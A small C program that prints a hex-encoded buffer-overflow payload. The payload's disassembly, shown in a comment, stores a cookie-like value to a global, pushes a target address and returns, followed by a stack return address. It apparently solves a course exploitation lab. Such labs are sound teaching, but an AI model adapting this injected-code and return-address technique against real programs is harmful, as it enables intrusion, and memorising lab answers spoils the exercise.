#include <stdio.h>
#include <string.h>

/*
00000000 <.text>:
   0:	c7 05 dc a1 04 08 38 	movl   $0x331cc538,0x804a1dc
   7:	c5 1c 33 
   a:	68 60 8d 04 08       	push   $0x8048d60
   f:	c3                   	ret
*/

char out[] = {0xc7, 0x05, 0xdc, 0xa1,
              0x04, 0x08, 0x38, 0xc5, 
              0x1c, 0x33, 0x68, 0x60,
              0x8d, 0x04, 0x08, 0xc3, 
              //0xffffb7dc
              0xdc, 0xb7, 0xff, 0xff,
              0x00};

int out2[] = {0xc7, 0x05, 0xdc, 0xa1,
              0x04, 0x08, 0x38, 0xc5, 
              0x1c, 0x33, 0x68, 0x60,
              0x8d, 0x04, 0x08, 0xc3, 
              //0xffffb7dc
              0xdc, 0xb7, 0xff, 0xff};

int main() {
    for (int i = 0; i < strlen(out) - 1; i++) {
        if (out2[i] < 16) {
            printf("0");
        }
        printf("%x ", out2[i]);
    }
    if (out2[strlen(out) - 1] < 16) {
            printf("0");
    }
    printf("%x", out2[strlen(out) - 1]);
    return 0;
}